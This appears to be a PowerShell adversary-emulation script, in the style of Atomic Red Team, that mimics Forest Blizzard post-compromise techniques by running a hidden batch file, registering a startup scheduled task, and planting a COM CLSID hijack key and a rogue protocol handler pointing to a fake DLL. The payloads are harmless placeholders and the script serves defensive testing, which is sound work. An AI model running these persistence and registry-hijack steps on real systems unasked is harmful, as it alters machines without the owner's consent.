# Author: The Haag
# Reference: https://www.microsoft.com/en-us/security/blog/2024/04/22/analyzing-forest-blizzards-custom-post-compromise-tool-for-exploiting-cve-2022-38028-to-obtain-credentials/

$asciiart = @"

###       #    #     #    ####### #     # #######    ####### ####### ######  #######  #####  #######    ######  #       ### ####### #######    #    ######  ######  
 #       # #   ##   ##       #    #     # #          #       #     # #     # #       #     #    #       #     # #        #       #       #    # #   #     # #     # 
 #      #   #  # # # #       #    #     # #          #       #     # #     # #       #          #       #     # #        #      #       #    #   #  #     # #     # 
 #     #     # #  #  #       #    ####### #####      #####   #     # ######  #####    #####     #       ######  #        #     #       #    #     # ######  #     # 
 #     ####### #     #       #    #     # #          #       #     # #   #   #             #    #       #     # #        #    #       #     ####### #   #   #     # 
 #     #     # #     #       #    #     # #          #       #     # #    #  #       #     #    #       #     # #        #   #       #      #     # #    #  #     # 
###    #     # #     #       #    #     # #######    #       ####### #     # #######  #####     #       ######  ####### ### ####### ####### #     # #     # ######  
                                                                                                                                                                    
"@
Write-Host $asciiart -ForegroundColor Magenta
Write-Host "Starting Atomic Red Team Tests for Forest Blizzard Techniques..." -ForegroundColor Cyan

$batchFilePath = "C:\ProgramData\execute.bat"
If (Test-Path $batchFilePath) {
    Remove-Item $batchFilePath -Force
    Write-Host "Previous batch file removed." -ForegroundColor Yellow
}

Write-Host "Test 1: Simulating Batch File Execution..." -ForegroundColor Cyan
$batchContent = @"
echo off
echo Simulated batch script running with SYSTEM permissions...
"@ 
$batchContent | Out-File -FilePath $batchFilePath
Start-Process "cmd.exe" "/c $batchFilePath" -WindowStyle Hidden
Write-Host "Batch file executed: $batchFilePath" -ForegroundColor Green

$taskName = "TestMaliciousTask"
If (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    Write-Host "Existing task removed." -ForegroundColor Yellow
}
Write-Host "Test 2: Creating Malicious Scheduled Task..." -ForegroundColor Cyan
$taskAction = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -WindowStyle Hidden -Command `"Write-Output 'Malicious task executed.'`""
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -ErrorAction Stop
Write-Host "Malicious scheduled task created: $taskName" -ForegroundColor Green

$rogueKey = "HKCU:\Software\Classes\CLSID\{026CC6D7-34B2-33D5-B551-CA31EB6CE345}\Server"
$roguePath = "C:\FakePath\wayzgoose.dll"
If (Test-Path $rogueKey) {
    Remove-Item $rogueKey -Force -Recurse
    Write-Host "Previous registry keys removed." -ForegroundColor Yellow
}
New-Item -Path $rogueKey -Force
New-ItemProperty -Path $rogueKey -Name "(Default)" -Value $roguePath -PropertyType String -Force
Write-Host "Registry manipulated to redirect print spooler to fake path: $roguePath" -ForegroundColor Green

$protocolKey = "HKCU:\Software\Classes\PROTOCOLS\Handler\rogue9471"
$clsid = "{026CC6D7-34B2-33D5-B551-CA31EB6CE345}"
If (Test-Path $protocolKey) {
    Remove-Item $protocolKey -Force
    Write-Host "Previous protocol handler removed." -ForegroundColor Yellow
}
New-Item -Path $protocolKey -Force
New-ItemProperty -Path $protocolKey -Name "CLSID" -Value $clsid -PropertyType String -Force
Write-Host "Custom protocol handler created: rogue9471 with CLSID $clsid" -ForegroundColor Green

Write-Host "All tests completed successfully! Check the results and ensure your systems are secure." -ForegroundColor Yellow
